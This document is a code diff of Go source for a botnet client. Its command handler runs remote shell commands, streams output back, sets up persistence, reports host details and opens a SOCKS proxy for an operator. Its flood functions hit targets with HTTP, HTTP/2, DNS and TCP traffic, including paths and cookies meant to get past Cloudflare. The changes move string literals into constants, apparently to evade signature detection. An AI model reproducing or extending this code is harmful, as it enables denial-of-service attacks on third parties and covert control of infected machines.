@@ -86,10 +86,10 @@ func blackEnergy(conn net.Conn, command string) error {
 		}
 		output, err := sidewinder(strings.Join(fields[1:], " "))
 		if err != nil {
-			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
 		} else {
 			encoded := base64.StdEncoding.EncodeToString([]byte(output))
-			conn.Write([]byte(fmt.Sprintf("OUTPUT_B64: %s\n", encoded)))
+			conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
 		}
 		return nil
 	case "!stream":
@@ -97,14 +97,14 @@ func blackEnergy(conn net.Conn, command string) error {
 			return fmt.Errorf("usage: !stream <command>")
 		}
 		go machete(strings.Join(fields[1:], " "), conn)
-		conn.Write([]byte("Streaming started\n"))
+		conn.Write([]byte(msgStreamStart))
 		return nil
 	case "!detach", "!bg":
 		if len(fields) < 2 {
 			return fmt.Errorf("usage: !detach <command>")
 		}
 		oceanLotus(strings.Join(fields[1:], " "))
-		conn.Write([]byte("Command running in background\n"))
+		conn.Write([]byte(msgBgStart))
 		return nil
 	case "!stop":
 		pikachu()
@@ -186,28 +186,28 @@ func blackEnergy(conn net.Conn, command string) error {
 		}
 	case "!persist":
 		go dragonfly()
-		conn.Write([]byte("Persistence setup initiated\n"))
+		conn.Write([]byte(msgPersistStart))
 	case "!kill":
-		conn.Write([]byte("Bot killing persistence and shutting down\n"))
+		conn.Write([]byte(msgKillAck))
 		nukeAndExit()
 	case "!info":
 		hostname, _ := os.Hostname()
 		arch := charmingKitten()
 		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", hostname, arch, mustangPanda(), runtime.GOOS)
-		conn.Write([]byte(fmt.Sprintf("INFO: %s\n", info)))
+		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, info)))
 	case "!socks":
 		if len(fields) < 2 {
 			return fmt.Errorf("usage: !socks <port>")
 		}
 		err := muddywater(fields[1], conn)
 		if err != nil {
-			conn.Write([]byte(fmt.Sprintf("SOCKS ERROR: %v\n", err)))
+			conn.Write([]byte(fmt.Sprintf(msgSocksErrFmt, err)))
 		} else {
-			conn.Write([]byte(fmt.Sprintf("SOCKS: Proxy started on port %s\n", fields[1])))
+			conn.Write([]byte(fmt.Sprintf(msgSocksStartFmt, fields[1])))
 		}
 	case "!stopsocks":
 		emotet()
-		conn.Write([]byte("SOCKS: Proxy stopped\n"))
+		conn.Write([]byte(msgSocksStop))
 	case "!socksauth":
 		if len(fields) < 3 {
 			return fmt.Errorf("usage: !socksauth <username> <password>")
@@ -216,7 +216,7 @@ func blackEnergy(conn net.Conn, command string) error {
 		proxyUser = fields[1]
 		proxyPass = fields[2]
 		socksCredsMutex.Unlock()
-		conn.Write([]byte(fmt.Sprintf("SOCKS: Auth updated (user: %s)\n", fields[1])))
+		conn.Write([]byte(fmt.Sprintf(msgSocksAuthFmt, fields[1])))
 	default:
 		return fmt.Errorf("unknown command")
 	}
@@ -353,17 +353,14 @@ func lucario(target string) (string, error) {
 		target = target[:idx]
 	}
 	// Try Cloudflare DoH first (bypasses local DNS filtering)
-	dohServers := []string{
-		"https://1.1.1.1/dns-query",
-		"https://cloudflare-dns.com/dns-query",
-	}
-	for _, server := range dohServers {
+	dohList := dohAttack
+	for _, server := range dohList {
 		url := fmt.Sprintf("%s?name=%s&type=A", server, target)
 		req, err := http.NewRequest("GET", url, nil)
 		if err != nil {
 			continue
 		}
-		req.Header.Set("Accept", "application/dns-json")
+		req.Header.Set("Accept", dnsJsonAccept)
 		client := &http.Client{Timeout: 5 * time.Second}
 		resp, err := client.Do(req)
 		if err != nil {
@@ -1025,8 +1022,8 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 		return
 	}
 	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)
-	userAgents := []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Mozilla/5.0 (Linux; Android 11; SM-G996B)", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"}
-	referers := []string{"https://www.google.com/", "https://www.example.com/", "https://www.wikipedia.org/"}
+	userAgents := shortUAs
+	referers := refererList
 
 	// Create shared transport for non-proxy mode (connection pooling)
 	var sharedClient *http.Client
@@ -1127,7 +1124,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 	if useProxy {
 		scheme := "https"
 		targetURL := fmt.Sprintf("%s://%s:%d", scheme, hostname, targetPort)
-		paths := []string{"/", "/index.html", "/api", "/search", "/login", "/wp-admin"}
+		paths := httpPaths
 		methods := []string{"GET", "POST", "HEAD"}
 
 		for i := 0; i < workerPool; i++ {
@@ -1193,7 +1190,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 	}
 	targetAddr := fmt.Sprintf("%s:%d", resolvedIP, targetPort)
 	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: hostname, MinVersion: tls.VersionTLS12, MaxVersion: tls.VersionTLS13}
-	paths := []string{"/", "/index.html", "/api", "/search", "/login", "/wp-admin"}
+	paths := httpPaths
 	methods := []string{"GET", "POST", "HEAD"}
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
@@ -1468,7 +1465,7 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 		scheme = "http"
 	}
 	_ = fmt.Sprintf("%s://%s:%d/", scheme, hostname, targetPort) // targetURL kept for reference
-	paths := []string{"/", "/index.php", "/wp-login.php", "/admin", "/api/v1/", "/search?q=" + turla(8), "/cdn-cgi/trace"}
+	paths := append(cfPaths, "/search?q="+turla(8))
 	sessionWorkers := 50
 	if workerPool < sessionWorkers {
 		sessionWorkers = workerPool
@@ -1506,7 +1503,7 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 					req.Header.Set("User-Agent", session.userAgent)
 					req.Header.Set("Accept", "text/html,application/xhtml+xml")
 					req.Header.Set("Connection", "close")
-					req.AddCookie(&http.Cookie{Name: "__cf_bm", Value: turla(32)})
+					req.AddCookie(&http.Cookie{Name: cfCookieName, Value: turla(32)})
 					resp, _ := session.client.Do(req)
 					if resp != nil {
 						io.Copy(io.Discard, resp.Body)
@@ -1709,7 +1706,7 @@ func salamence(targetIP string, targetPort, duration int) {
 	defer cancel()
 	var packetCount int64
 	var wg sync.WaitGroup
-	domains := []string{"youtube.com", "google.com", "spotify.com", "netflix.com", "bing.com", "facebook.com", "amazon.com"}
+	domains := dnsFloodDomains
 	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
@@ -1838,7 +1835,7 @@ func gengar(targetIP string, targetPort, duration int) {
 					if err != nil {
 						continue
 					}
-					conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
+					conn.Write([]byte(tcpPayload))
 					conn.Close()
 				}
 			}
@@ -1998,7 +1995,7 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 	// TLS handshake with ALPN h2
 	tlsConn := tls.Client(rawConn, &tls.Config{
 		ServerName:         host,
-		NextProtos:         []string{"h2"},
+		NextProtos:         []string{alpnH2},
 		InsecureSkipVerify: true,
 	})
 	if err := tlsConn.Handshake(); err != nil {
@@ -2007,7 +2004,7 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 	}
 	defer tlsConn.Close()
 
-	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+	if tlsConn.ConnectionState().NegotiatedProtocol != alpnH2 {
 		return fmt.Errorf("h2 not negotiated")
 	}
 
